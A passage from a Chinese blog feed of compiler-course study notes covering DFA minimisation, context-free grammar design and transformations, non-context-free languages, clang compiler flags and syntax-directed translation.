word-break: break-all; text-overflow: ellipsis; overflow: hidden; -webkit-line-clamp: 1; -webkit-box-orient: vertical;"><span style="display: inline-flex; align-items: center;"><svg class="Zi Zi--InsertLink" fill="currentColor" viewBox="0 0 24 24" width="14" height="14"><path d="M13.414 4.222a4.5 4.5 0 1 1 6.364 6.364l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005a2.5 2.5 0 1 0-3.536-3.536l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005zm-6.187 6.187a.5.5 0 0 1 .638-.058l.07.058.706.707a.5.5 0 0 1 .058.638l-.058.07-3.005 3.004a2.5 2.5 0 0 0 3.405 3.658l.13-.122 3.006-3.005a.5.5 0 0 1 .638-.058l.069.058.707.707a.5.5 0 0 1 .058.638l-.058.069-3.005 3.005a4.5 4.5 0 0 1-6.524-6.196l.16-.168 3.005-3.005zm8.132-3.182a.25.25 0 0 1 .353 0l1.061 1.06a.25.25 0 0 1 0 .354l-8.132 8.132a.25.25 0 0 1-.353 0l-1.061-1.06a.25.25 0 0 1 0-.354l8.132-8.132z"></path></svg></span><span>https://wangwangok.github.io/2019/10/28/compiler_regular2dfa/</span></span></span></a></p><h4 id="实例-1">实例</h4><p>最小化上面求得的DFA：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210558147478_146_20221107081651688510_197_image-20221106114818599.png" alt="image-20221106114818599"><figcaption aria-hidden="true">image-20221106114818599</figcaption></figure><p>初始非终态{A, B, C, D}，终态{E, F, G, H, I}，</p><p>终态内部自己打转儿，不可再分</p><p>0将前者分裂为{A, B, C}和{D}，1将前者分裂为{A,B}和{C}，至此不可再分</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210600746159_100_20221107081655357057_638_image-20221106175951220.png" alt="image-20221106175951220"><figcaption aria-hidden="true">image-20221106175951220</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理-上下文无关文法</title>
    <link href="/posts/44201/"/>
    <url>/posts/44201/</url>
    
    <content type="html"><![CDATA[<h1 id="编译原理-上下文无关文法">编译原理-上下文无关文法</h1><h2 id="cfg基本概念">CFG基本概念</h2><p><font color="Apricot">符号串集合！</font></p><p>CFG可以表示所有正则表达式的所能表达文法集合，反过来不成立</p><h3 id="cfg设计">CFG设计</h3><p>可以结合正则表达式设计，思路类似。</p><ul><li><p>最基本的一个例子：<span class="math inline">\(L=\{abb^{2n}|n≥0\}\)</span></p><p>S→b|aSbb</p></li><li><p>设计接受语言<span class="math inline">\({\{a^ib^ja^kb^l| i+j=k+l,i, j, k, l&gt;=0\}}\)</span>的上下文无关文法。</p><p>S→aSb | A | B | M</p><p>A→aAa | M</p><p>B→bBb | M</p><p>M→bMa | e</p><p>思路：两边对称，先构造中间，再对称的加a或b。特别注意，A，B只涵盖了“一边的情况，所以”S→aSb“是必须的。</p></li><li><p>设计接受C++数组声明语句的上下文无关文法，其中数组元素类型限定为int、char及它们的指针，数组维数可以是任意维。</p><p>D→T id M ;</p><p>T→int | char | T*</p><p>M→M [num] | [num]</p><p>注意：指针也可以套任意个</p></li><li><p>形如xy(x≠y)的01串</p><p><span class="math inline">\(S \rightarrow A B \mid B A\)</span> <span class="math inline">\(A \rightarrow X A X \mid 0\)</span> ( <span class="math inline">\(A\)</span> 是奇数长度, 中间为 0 的串) <span class="math inline">\(B \rightarrow X B X \mid 1\)</span> ( <span class="math inline">\(B\)</span> 是奇数长度, 中间为 1 的串) <span class="math inline">\(X \rightarrow 0 \mid 1\)</span></p></li><li><p>接受语言 <span class="math inline">\(\left\{a^i b^j a^k \midj=i+k, i&gt;=0, k&gt;=0\right\}\)</span> 的上下文无关文法。 答: <span class="math display">\[\begin{aligned}&amp;\mathbf{S} \rightarrow \mathbf{A B} \\&amp;\mathbf{A} \rightarrow \mathbf{a A b} \mid \varepsilon \\&amp;\mathbf{B} \rightarrow \mathbf{b B a} \mid \varepsilon\end{aligned}\]</span></p></li></ul><p>练习：</p><ol type="1"><li><p><span class="math inline">\(\quad\left\{0^i 1^j 0^k \mid j=2i+k\right\}\)</span></p><p>仿照最后一个题容易得到答案</p></li><li><p>无法写成 <span class="math inline">\(x x\)</span> 形式的 01串</p><p>仿照倒数第二个题，<span class="math inline">\(S \rightarrow A B \midB A \mid A \mid B \mid \varepsilon\)</span></p></li></ol><h3 id="nfa和cfg转换">NFA和CFG转换</h3><p>一一对应即可，非常简单</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205642582509_675_20221201120121396547_551_image-20221115092857560.png" alt="image-20221115092857560"><figcaption aria-hidden="true">image-20221115092857560</figcaption></figure><p>注意别忘了终态的规则(替换空串)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205643806820_805_20221201120122982777_294_image-20221115093159798.png" alt="image-20221115093159798"><figcaption aria-hidden="true">image-20221115093159798</figcaption></figure><p>“不包含子串011的01串，3显然不需要包含进CFG”</p><h2 id="cfg修改">CFG修改</h2><h3 id="消除二义性">消除二义性</h3><p>消除二义性没有固定的套路，建立在对文法理解的基础上。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205645038077_709_image-20221201134248289.png" alt="image-20221201134248289"><figcaption aria-hidden="true">image-20221201134248289</figcaption></figure><h3 id="消除左递归">消除左递归</h3><p>消除直接左递归很简单，在龙书第二章有所讲述。下面一个消除间接左递归的例子：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205646564550_859_20221201120126538302_916_image-20221115094108795.png" alt="image-20221115094108795" width="67%" height="67%"></p><h3 id="消除空字">消除空字</h3><p>消除空字需要注意的一点时一定要替换“干净”，即所有与含有空字的非终结符文法定义相关的条目都要考虑并替换</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205648003494_548_20221201120128030368_860_image-20221115094610591.png" alt="image-20221115094610591"><figcaption aria-hidden="true">image-20221115094610591</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205649177202_905_20221201120129388514_865_image-20221115094838176.png" alt="image-20221115094838176"><figcaption aria-hidden="true">image-20221115094838176</figcaption></figure><h3 id="消除回路">消除回路</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205650398355_928_20221201120130871049_366_image-20221115095219937.png" alt="image-20221115095219937"><figcaption aria-hidden="true">image-20221115095219937</figcaption></figure><h3 id="左公因子提取">左公因子提取</h3><p><span class="math inline">\(A \rightarrow \alpha \beta_1 \mid \alpha\beta_2\)</span> 改写为： <span class="math inline">\(\mathrm{A}\rightarrow \alpha \mathrm{A}^{\prime}\)</span> <span class="math inline">\(A^{\prime} \rightarrow \beta_1 \mid\beta_2\)</span></p><p>例子：</p><p><span class="math inline">\(\mathrm{S} \rightarrow\mathrm{iEtS}|\mathrm{iEtSeS}| \mathrm{a}\)</span> <span class="math inline">\(\mathrm{E} \rightarrow \mathrm{b}\)</span> i <span class="math inline">\(\rightarrow\)</span> if, t$ $ then, e <span class="math inline">\(\rightarrow\)</span> else, E <span class="math inline">\(\rightarrow\)</span> 表达式, S <span class="math inline">\(\rightarrow\)</span> 语句 改写为: <span class="math inline">\(\mathrm{S} \rightarrow \mathrm{iEtSS}\)</span> ' |a <span class="math inline">\(\mathrm{S}^{\prime} \rightarrow\mathrm{eS} \mid \varepsilon\)</span> <span class="math inline">\(\mathrm{E} \rightarrow \mathrm{b}\)</span></p><h2 id="cfg无法描述的语言结构">CFG无法描述的语言结构</h2><p>(重在理解)</p><p>例1: <span class="math inline">\(\mathrm{L}_1=\left\{\mathrm{wcw}\mid \mathrm{w} \in(\mathrm{a} \mid \mathrm{b})^*\right\}\)</span></p><p>检查标识符(w)必须在使用之前定义</p><p>语义分析阶段才能完成的事情</p><p>例2: <span class="math inline">\(\mathrm{L}_2=\left\{a^{\mathrm{n}}b^m c^n d^m \mid n \geqslant 1\right.\)</span> 且 <span class="math inline">\(\left.m \geqslant 1\right\}\)</span></p><p>检查函数的形参 (声明) 与实参 (调用)的数目是否匹配</p><p>语法定义一般不考虑参数数目</p><p>例3: <span class="math inline">\(\mathrm{L}_3=\left\{\mathrm{a}^{\mathrm{n}}b^{\mathrm{n}} \mathrm{c}^{\mathrm{n}} \mid \mathrm{n} \geq0\right\}\)</span></p><p>排版软件, 文本加下划线: <span class="math inline">\(\mathrm{n}\)</span> 个字符, <span class="math inline">\(\mathrm{n}\)</span> 个退格, <span class="math inline">\(\mathrm{n}\)</span> 个下划线</p><p><span class="math inline">\(\mathrm{a}^{\mathrm{n}}b^{\mathrm{n}}\)</span>容易描述(S→aSb)</p><p>另一种方式: 字符一退格一下划线三元 组序列, <span class="math inline">\((\mathrm{abc})^*\)</span>就可以描述了</p><p><strong>可以描述的类似文法：</strong></p><p><span class="math inline">\(\mathrm{L}_1{}^{\prime}=\left\{\mathrm{w} \mathrm{c}\mathrm{w}^{\mathrm{R}}\mathrm{w} \in(\mathrm{a} \mid \mathrm{b})^*,\mathrm{w}^{\mathrm{R}}\right.\)</span> 为<span class="math inline">\(\mathrm{w}\)</span>的反转 <span class="math inline">\(\}\)</span></p><p><span class="math inline">\(\mathrm{S} \rightarrow\mathrm{aSa}|\mathrm{bSb}| \mathrm{c}\)</span> <span class="math inline">\(\mathrm{L}_2{}^{\prime}=\left\{\mathrm{a}^{\mathrm{n}} \mathrm{b}^{\mathrm{m}}\mathrm{c}^{\mathrm{m}} \mathrm{d}^{\mathrm{n}} \mid \mathrm{n}\geqslant 1\right.\)</span> 且 <span class="math inline">\(\left.\mathrm{m} \geqslant 1\right\}\)</span></p><p>和考试题类似，中心对称的，先处理中间</p><p><span class="math inline">\(\mathrm{S} \rightarrow\mathrm{aSd}|\mathrm{aAd} \quad \mathrm{A} \rightarrow \mathrm{bAc}|\mathrm{bc}\)</span></p><p><span class="math inline">\(\mathrm{L}_2{}^=\left\{\mathrm{a}^{\mathrm{n}} b^{\mathrm{n}}\mathrm{c}^{\mathrm{m}} \mathrm{d}^{\mathrm{m}} \mid \mathrm{n}\geqslant 1\right.\)</span> 且 <span class="math inline">\(\left.m\geqslant 1\right\}\)</span></p><p>轴对称的，先处理两边</p><p><span class="math inline">\(\mathrm{S} \rightarrow \mathrm{AB} \quad\mathrm{A} \rightarrow \mathrm{aAb}|\mathrm{ab} \quad \mathrm{B}\rightarrow \mathrm{cBd}| \mathrm{cd}\)</span></p><p><span class="math inline">\(\mathrm{L}_3{}^{\prime}=\left\{\mathrm{a}^{\mathrm{n}} \mathrm{b}^{\mathrm{n}} \mid\mathrm{n} \geq 1\right\}\)</span></p><p><span class="math inline">\(\mathrm{S} \rightarrow \mathrm{aSb} \mid\mathrm{ab}\)</span></p><p>PS：证明<span class="math inline">\(\mathrm{L}_3{}^{\prime}\)</span>不能用正则表达式表示</p><p>可以考虑证明它不能使用DFA进行表示。证明的关键就是定义”DF“(确定，有穷):</p><p>假定存在DFA D接受 <span class="math inline">\(\mathrm{L}_3{}^{\prime}\)</span>, 其状态数为 <span class="math inline">\(k\)</span>(有穷)。 设状态 <span class="math inline">\(\mathrm{s}_0, \mathrm{~s}_1, \ldots,\mathrm{s}_{\mathrm{k}}\)</span> 为读入 <span class="math inline">\(\varepsilon, \mathrm{a}, \mathrm{aa}, \ldots,\mathrm{a}^{\mathrm{k}}\)</span> 后的状态 <span class="math inline">\(\Rightarrow \mathrm{s}_{\mathrm{i}}\)</span>为读入 <span class="math inline">\(\mathrm{i}\)</span> 个 <span class="math inline">\(\mathrm{a}\)</span> 达到的状态 <span class="math inline">\((0 \leqslant \mathrm{i} \leqslant\mathrm{k})\)</span> 总状态数 <span class="math inline">\(\mathrm{k}\rightarrow \mathrm{s}_0, \mathrm{~s}_1, \ldots,\mathrm{s}_{\mathrm{k}}\)</span> 中至少有两个相同状态, 不妨设为 <span class="math inline">\(s_i 、 s_j ， i&lt;j\)</span></p><p><span class="math inline">\(a^i b^i \in L_3 \rightarrow \Rightarrows_i\left(s_j\right)\)</span> 到终态路径标记为 <span class="math inline">\(b^i\)</span> <span class="math inline">\(\rightarrow\)</span> 初态 <span class="math inline">\(\rightarrow\)</span> 终态还有标为 <span class="math inline">\(a^i b^i\)</span> 的路径 <span class="math inline">\(\rightarrow D\)</span> 接受 <span class="math inline">\(a^i b^i\)</span>, 与”D(确定)“矛盾！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/20230828205651744661_709_20221201120132392020_526_image-20221115103746485.png" alt="image-20221115103746485"><figcaption aria-hidden="true">image-20221115103746485</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理一二章</title>
    <link href="/posts/34738/"/>
    <url>/posts/34738/</url>
    
    <content type="html"><![CDATA[<h2 id="编译原理概述">编译原理概述</h2><p class="note note-info">此部分对应于龙书第一二章</p><h3 id="lec1从代码到可执行文件">Lec1从代码到可执行文件</h3><h4 id="编译器要做哪些事情">编译器要做哪些事情？</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211119353519_528_20221008190733227216_229_image-20220929095525300.png" alt="image-20220929095525300"><figcaption aria-hidden="true">image-20220929095525300</figcaption></figure><h5 id="一些gcc编译选项">一些gcc编译选项</h5><h6 id="actions"><a href="https://clang.llvm.org/docs/ClangCommandLineReference.html#id6">Actions</a></h6><p>The action to perform on the input.</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-klzxmjlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-klzxmjlluwpkzu"><pre><code class="hljs shell">-E, --preprocessOnly run the preprocessor-S, --assembleOnly run preprocess and compilation steps-c, --compileOnly run preprocess, compile, and assemble steps-emit-llvmUse the LLVM representation for assembler and object files</code></pre></div></div><h6 id="compilation-flags"><a href="https://clang.llvm.org/docs/ClangCommandLineReference.html#id7">Compilationflags</a></h6><p>Flags controlling the behavior of Clang during compilation. Theseflags have no effect during actions that do not perform compilation.</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c3cwrflluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-c3cwrflluwpkzu"><pre><code class="hljs shell">-Xassembler &lt;arg&gt;`Pass &lt;arg&gt; to the assembler-Xclang &lt;arg&gt;, -Xclang=&lt;arg&gt;Pass &lt;arg&gt; to clang -cc1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211120797372_244_20221008190735472529_960_image-20220920154109066.png" alt="image-20220920154109066"><figcaption aria-hidden="true">image-20220920154109066</figcaption></figure><p>上面是<strong>抽象语法树</strong>：简化，只包含程序中出现的单词</p><p>下面是<strong>语义分析树（具体语法树）</strong>：完整，还包含抽象出的语法概念</p><h5 id="对过程的相关理解">对过程的相关理解</h5><p class="note note-info">C++编译器检查相容类型计算是否合规是在语义分析阶段编译器识别出标识符是在词法分析阶段</p><p class="note note-warning">C++编译器过滤注释是在_<strong>阶段。答案是词法分析，但实践表明预处理阶段就已经过滤注释了。C++编译器检查数组下标越界是在</strong>_阶段 C++并不会检查数组下标越界。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211121869942_277_20221008190736776341_330_image-20220920162038518.png" alt="image-20220920162038518"><figcaption aria-hidden="true">image-20220920162038518</figcaption></figure><p>显然符号表中不会存变量值，因为变量值在运行时才会确定。</p><p class="note note-info">符号表是在词法分析阶段创建的。(习题)</p><p>但是据龙书：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211123322922_438_20221008190738941427_725_image-20221004193852281.png" alt="image-20221004193852281"><figcaption aria-hidden="true">image-20221004193852281</figcaption></figure><h3 id="lec2-构造一个简单的编译器">Lec2 构造一个简单的编译器</h3><h4 id="上下文无关文法">上下文无关文法</h4><h5 id="感性理解">感性理解</h5><p>BNF 是一种<strong>上下文无关文法</strong>，那什么是上下文相关文法(CSG呢？</p><p>CSG 在 CFG的基础上进一步放宽限制。</p><p>产生式的左手边也可以有终结符和非终结符。左手边的终结符就是“上下文”的来源。也就是说匹配的时候不能光看当前匹配到哪里了，还得看当前位置的左右到底有啥（也就是上下文是啥），上下文在这条规则应用的时候并不会被消耗掉，只是“看看”。</p><h5 id="形式化定义">形式化定义</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211124604391_685_20221008190740496671_209_image-20220927144906987.png" alt="image-20220927144906987"><figcaption aria-hidden="true">image-20220927144906987</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211126622831_534_20221008190741666990_453_image-20220927144926174.png" alt="image-20220927144926174"><figcaption aria-hidden="true">image-20220927144926174</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211127927939_512_20221008190742819758_795_image-20220927144938067.png" alt="image-20220927144938067"><figcaption aria-hidden="true">image-20220927144938067</figcaption></figure><p>对闭包的理解</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211128816534_639_20221008190743880629_933_image-20220927144950874.png" alt="image-20220927144950874"><figcaption aria-hidden="true">image-20220927144950874</figcaption></figure><p>正闭包也叫正则闭包</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211130464043_550_20221008190746344914_185_image-20220927145026025.png" alt="image-20220927145026025"><figcaption aria-hidden="true">image-20220927145026025</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211132375050_774_20221008190747551802_775_image-20221004164810301.png" alt="image-20221004164810301"><figcaption aria-hidden="true">image-20221004164810301</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211133521440_898_20221008190748466161_250_image-20220927150609696.png" alt="image-20220927150609696"><figcaption aria-hidden="true">image-20220927150609696</figcaption></figure><p>在词法分析阶段，所有的expr都是同等对待的，因此不需要加下标</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211134687341_281_20221008190749626754_765_image-20220927150731839.png" alt="image-20220927150731839"><figcaption aria-hidden="true">image-20220927150731839</figcaption></figure><p>idlist也可用右递归表示。两种方式等价，但生成的语法分析树不一样。</p><p>另外一种设计方案</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211135780921_381_20221008190750857129_584_image-20220927155732458.png" alt="image-20220927155732458" width="50%" height="50%"></p><h5 id="二义性语法和非二义性语法">二义性语法和非二义性语法</h5><p>非二义性语法</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211137013371_846_20221008190751862164_535_image-20220927154102321.png" alt="image-20220927154102321"><figcaption aria-hidden="true">image-20220927154102321</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211139474241_687_20221008190753296213_768_image-20220927154131189.png" alt="image-20220927154131189" width="50%" height="50%"></p><p>采用二义性语法，则会产生歧义问题，同一段代码在不同编译器上产生不一样的结果，显然是我们不想看到的</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211140874074_275_20221008190754314719_452_image-20220927154314035.png" alt="image-20220927154314035"><figcaption aria-hidden="true">image-20220927154314035</figcaption></figure><p>但是在一定的场合下，通过设计合理的语法分析算法，我们是容许一定的二义性的，因为可以减小语法分析树的复杂性。</p><p>文法左递归，体现出运算符左结合，右递归则是右结合。</p><p>一个右结合的例子</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211141917463_901_20221008190755524185_246_image-20220927155426816.png" alt="image-20220927155426816" width="50%" height="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211143701152_922_20221008190756637988_463_image-20220927161055294.png" alt="image-20220927161055294"><figcaption aria-hidden="true">image-20220927161055294</figcaption></figure><p>注意：不要跳级！左结合的，且从左往右替换。</p><h5 id="练习">练习</h5><h6 id="推导练习">推导练习</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211145333372_860_20221008190758243317_959_image-20220927161040537.png" alt="image-20220927161040537"><figcaption aria-hidden="true">image-20220927161040537</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211146677523_971_20221008190759789619_359_image-20220928164050330.png" alt="image-20220928164050330"><figcaption aria-hidden="true">image-20220928164050330</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211150596966_916_20221008190801270074_244_image-20220928164220732.png" alt="image-20220928164220732"><figcaption aria-hidden="true">image-20220928164220732</figcaption></figure><ol type="1"><li>S -&gt; 0 S 1 | 0 1</li><li>S -&gt; + S S | - S S | a</li><li>S -&gt; S ( S ) S | ε</li><li>S -&gt; a S b S | b S a S | ε</li></ol><p>生成的语言：</p><ol type="1"><li><p>L = {0<sup>n</sup>1<sup>n</sup> | n&gt;=1}</p></li><li><p>L = {支持加法和减法的表达式的前缀表达形式}</p></li><li><p>L = {匹配括号的任意排列和嵌套的括号串，包括 ε}</p><p>()() (()())等</p><p>有二义性：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211152198729_696_20221025232537498298_547_2.2.3-3.png" alt="2.2.3-3"><figcaption aria-hidden="true">2.2.3-3</figcaption></figure></li><li><p>L = {数量相同的a和b组成的符号串，包括 ε}</p></li></ol><p class="note note-warning">一个文法有二义性不一定就有两个推导！但一定有两课语法树</p><p><a href="https://blog.csdn.net/severestcritic/article/details/109816062?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-109816062-blog-88792616.pc_relevant_aa&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-109816062-blog-88792616.pc_relevant_aa&amp;utm_relevant_index=1">证明语法具有二义性的方法</a></p><h6 id="构建练习">构建练习</h6><p>①</p><p>通常左递归对应左结合，右递归对应右结合。</p><p>比如对于标识符列表：</p><ol type="1"><li>list -&gt; list , id | id</li><li>list -&gt; id , list | id</li></ol><p>1是左结合的，2是右结合的。</p><p>②</p><ol type="1"><li><p>证明：用下面文法生成的所有二进制串的值都能被3整除。`</p><p>num -&gt; 11 | 1001 | num 0 | num num</p><p>符合该文法的二进制串一定是由任意数量的 11，1001 和 0组成的最左位不为0的序列</p><p>该序列的十进制和为： <span class="math display">\[sum =\Sigma_n\left(2^1+2^0\right) *2^n+\Sigma_m\left(2^3+2^0\right) *2^m\\=\Sigma_n 3*2^n+\Sigma_m 9 * 2^m\]</span></p><p>显然是能被3整除的</p></li><li><p>上面的文法是否能生成所有能被3整除的二进制串？</p><p>不能。二进制串10101，数值为21，可被3整除，但无法由文法推导出。</p></li></ol><h4 id="语法制导翻译">语法制导翻译</h4><p>构造翻译模式，中缀-&gt;后缀构造9-5+2的带语义动作的语法分析树，即输出其后缀表达式95-2+</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211153069316_794_20221008190802895392_835_image-20220927164002512.png" alt="image-20220927164002512"><figcaption aria-hidden="true">image-20220927164002512</figcaption></figure><p>按深度优先遍历即可打印（翻译）出后缀表达式</p><h4 id="语法分析">语法分析</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211154812241_599_20221008190804367395_700_image-20221004152318374.png" alt="image-20221004152318374"><figcaption aria-hidden="true">image-20221004152318374</figcaption></figure><h5 id="自顶向下构造">自顶向下构造</h5><h6 id="平凡算法扫描输入分析">平凡算法：扫描输入分析</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211203906407_721_20221008190808051693_827_image-20221004153229852.png" alt="image-20221004153229852"><figcaption aria-hidden="true">image-20221004153229852</figcaption></figure><h6 id="优化预测分析">优化：预测分析</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211206522350_121_20221008190811525061_463_image-20221004152448359.png" alt="image-20221004152448359"><figcaption aria-hidden="true">image-20221004152448359</figcaption></figure><p><span class="math inline">\(lookahead\)</span>在构造编译器的时候就可以完成。</p><p>实例分析</p><figure><img 